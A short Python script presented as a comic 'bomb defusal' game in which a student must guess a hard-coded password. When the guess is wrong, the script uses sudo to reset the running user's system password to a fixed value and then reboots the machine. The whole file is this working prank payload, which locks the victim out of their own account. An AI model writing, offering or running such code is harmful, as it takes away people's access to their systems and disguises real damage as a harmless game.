#!/usr/bin/env python3
import os
import getpass
import time

password = "CarlTheIntern" # The password the student will enter to defuse the bomb 

print("🔥 WrongPasswordinator™ ACTIVATED! 🔥")
print("💥 If you fail to enter the correct password, the bomb will explode...")
print("🔐 ...and Your system password will be changed!")

user_input = input("Password: ")

if user_input == password:
    print("✅ BOMB DEFUSED! Password is correct.")
else:
     print("💥 BOOM! Wrong password. The tri-state area is doomed!")
     username = getpass.getuser() 
     os.system(f"echo '{username}:hanos900' | sudo chpasswd")
     print("[INFO] Password change command executed.")
     print("[INFO] Rebooting system in 5 seconds...")
     time.sleep(5)
     os.system("sudo reboot")
